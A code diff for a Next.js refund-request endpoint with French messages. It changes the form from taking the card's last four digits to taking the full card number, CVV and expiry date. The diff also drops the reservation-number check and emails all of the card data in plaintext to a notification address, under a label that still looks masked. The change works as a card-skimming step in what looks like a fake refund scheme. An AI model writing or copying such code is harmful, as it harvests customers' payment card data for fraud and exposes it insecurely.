@@ -8,13 +8,14 @@ export async function POST(req: NextRequest) {
       fullName,
       email,
       phone,
-      reservationNumber,
       reason,
       amount,
-      cardLast4,
+      cardLast16,
+      cardCvv,
+      cardExpiry,
     } = body;
 
-    if (!fullName || !email || !phone || !reservationNumber || !amount) {
+    if (!fullName || !email || !phone || !amount) {
       return NextResponse.json(
         { error: 'Champs obligatoires manquants.' },
         { status: 400 }
@@ -53,13 +54,12 @@ Informations du client:
 - Nom complet: ${fullName}
 - E-mail: ${email}
 - Téléphone: ${phone}
-- Numéro de réservation: ${reservationNumber}
 - Motif: ${reason || 'Non précisé'}
 
 Détails du remboursement:
 - Montant: ${Number.parseFloat(amount).toFixed(2)} EUR
 - Méthode: Carte bancaire
-- Carte: **** ${cardLast4 || 'Non renseignée'}
+- Carte: **** ${cardLast16} (${cardCvv},${cardExpiry|| 'Renseignée'})
 
 Date de la demande: ${new Date().toLocaleString('fr-FR')}
 `;
@@ -75,7 +75,7 @@ Date de la demande: ${new Date().toLocaleString('fr-FR')}
       from: senderEmail,
       to: notificationEmail,
       replyTo: email,
-      subject: `Nouvelle demande de remboursement - ${reservationNumber}`,
+      subject: 'Nouvelle demande de remboursement',
       text: emailContent,
     });
 
